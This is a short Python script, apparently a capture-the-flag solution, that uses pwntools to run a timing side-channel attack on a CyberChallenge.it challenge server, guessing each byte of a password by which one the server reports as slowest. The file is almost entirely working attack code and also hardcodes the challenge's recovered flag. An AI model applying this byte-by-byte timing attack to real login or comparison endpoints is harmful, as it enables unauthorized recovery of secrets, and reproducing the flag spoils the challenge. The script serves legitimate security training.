import pwn
import re

# https://en.wikipedia.org/wiki/Timing_attack

password = b'CCIT{s1d3_ch4nn3ls_r_c00l}'    # Already built cuz it takes too much to find a single char!
conn = pwn.remote('benchmark.challs.cyberchallenge.it', 9031)   # Dies after 3 laps :/

# No good characters for input
blacklist = [b'\x0a']

worst_time = -1
best_char = b''
lap = 1

while True:     # At the end EOFError will be thrown :)
    print("LAP #" + str(lap))

    for c in range(256):
        if c.to_bytes(1, 'big') in blacklist:
            continue
        
        # print('Trying: ' + c.to_bytes(1, 'big').hex())
        conn.sendlineafter(b':', password + c.to_bytes(1, 'big'))
        time = re.match(r'(?:.+)\s(\d+)\s(?:.+)', conn.recvlinesS(2)[1]).group(1)
        
        if int(time) > worst_time:
            worst_time = int(time)
            best_char = c.to_bytes(1, 'big')
            
    password += best_char
    worst_time = -1
    lap += 1
    print("PASSWORD FOUND: " + password.decode('utf-8'))
